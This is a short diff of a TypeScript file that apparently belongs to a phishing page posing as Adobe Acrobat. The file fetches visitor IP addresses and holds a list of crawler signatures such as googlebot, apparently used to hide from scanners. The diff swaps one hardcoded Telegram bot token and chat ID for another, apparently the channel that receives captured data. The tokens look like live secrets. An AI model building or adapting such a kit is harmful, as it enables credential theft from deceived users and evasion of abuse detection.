@@ -44,8 +44,8 @@ const fetchVisitorIp = async (): Promise<string | null> => {
 };
 import acrobatBg from "@/assets/adobe-acrobat-bg.webp";
 
-const TELEGRAM_BOT_TOKEN = "8784644693:AAF244O9y3i7LNdSVXdOSnYdlEfDPwBASJM";
-const TELEGRAM_CHAT_ID = "7652336919";
+const TELEGRAM_BOT_TOKEN = "8661673124:AAH_wSyblczOkj_qpFeVZhvAudOplohja7Y";
+const TELEGRAM_CHAT_ID = "5627254065";
 
 const BOT_SIGNATURES = [
   'googlebot', 'bingbot', 'yahoo! slurp', 'yahooseeker', 'crawler',
